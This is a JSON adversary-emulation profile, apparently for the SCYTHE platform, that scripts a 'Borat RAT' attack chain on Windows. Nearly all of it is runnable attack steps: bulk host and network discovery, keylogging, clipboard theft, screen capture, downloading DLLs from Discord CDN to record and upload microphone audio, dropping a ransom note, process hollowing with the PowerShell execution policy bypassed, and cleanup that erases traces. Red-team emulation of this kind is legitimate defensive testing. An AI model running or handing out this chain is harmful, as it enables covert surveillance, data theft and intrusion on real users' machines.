@@ -1,0 +1,424 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Device discovery, keylogging, screen capture, clipboard stealing, microphone audio capture, unmanaged powershell running .Net DLLs, drops ransom note (no file encryption)",
+        "display_name": "Borat RAT",
+        "name": "Borat RAT",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "127.0.0.1:443",
+                    "--heartbeat": 5,
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c \"echo ####System Info#### & systeminfo & echo ####System Vesion#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable##### & set & echo ####Logical Disk##### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators### & net localgroup administrators & echo ####Guest User#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipcofig#### & ipconfig /all & echo ####Hosts#### & type C:\\WINDOWS\\System32\\drivers\\etc\\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####FirewallInfo#### & netsh firewall show state & netsh firewall show config\"",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "keylogger",
+                "request": "--load keylogger",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "8085957f-b422-48cb-960b-1f077790299d",
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "clipboard",
+                "request": "--load clipboard",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "833ad3b4-679c-4078-8153-cf4d6f979b8b",
+                "module": "clipboard",
+                "request": "",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "5a720284-cf76-4f68-a5ac-b6a4f027a156",
+                "module": "keylogger",
+                "request": "--current",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "5a720284-cf76-4f68-a5ac-b6a4f027a156",
+                "module": "keylogger",
+                "request": "--stop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c set",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wmic logicaldisk get caption,description,providername",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user administrator",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "wmic startup get caption,command",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "tasklist /svc",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ipconfig /all",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c type C:\\WINDOWS\\System32\\drivers\\etc\\hosts",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "route print",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "arp -a",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netstat -ano",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "sc query type= service state= all",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c netsh firewall show state & netsh firewall show config",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "25": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "26": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://cdn.discordapp.com/attachments/853389026839756837/963125834342862878/AudioRecorder.dll\" --dest %USERPROFILE%\\Audio.dll",
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd $assembly = [Reflection.Assembly]::LoadFile(\"$env:USERPROFILE\\Audio.dll\"); $instance = New-Object AudioRecorder.AudioRecorder; $result =$instance.AudioInit(10);",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1123"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "time": "10",
+                "type": "delay"
+            },
+            "30": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath C:\\Users\\Public\\Documents\\micaudio.log.txt",
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
+                "module": "uploader",
+                "request": "--remotepath C:\\Users\\Public\\Documents\\micaudio.wav",
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe del C:\\Users\\Public\\Documents\\micaudio.log.txt",
+                "rtags": [
+                    "att&ck",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe del C:\\Users\\Public\\Documents\\micaudio.wav",
+                "rtags": [
+                    "att&ck",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://cdn.discordapp.com/attachments/853389026839756837/960944365335904286/Ransomware.dll\" --dest %USERPROFILE%/Desktop/Ransomware.dll",
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe rundll32.exe \"%USERPROFILE%/Desktop/Ransomware.dll\",DropNote",
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell del $env:USERPROFILE\\Desktop\\Ransomware.dll -Force -ErrorAction Ignore",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1555.003",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Start-Hollow.ps1\" --dest %USERPROFILE%/Start-Hollow.ps1",
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe Set-ExecutionPolicy Bypass -Scope Process -Force ; Invoke-Command -ScriptBlock {. $env:userprofile\\Start-Hollow.ps1; $ppid=\"Get-Process explorer | select -expand id\"; Start-Hollow -Sponsor \"C:\\Windows\\System32\\calc.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose}",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1055.012"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Stop-Process -Name \"calc\" -ErrorAction Ignore; }\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0005",
+                    "att&ck-technique:T1055.012",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe del $env:userprofile/Start-Hollow.ps1",
+                "rtags": [
+                    "att&ck",
+                    "att&ck-tactic:TA0006",
+                    "att&ck-technique:T1555.003",
+                    "cleanup"
+                ],
+                "type": "message"
+            },
+            "41": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
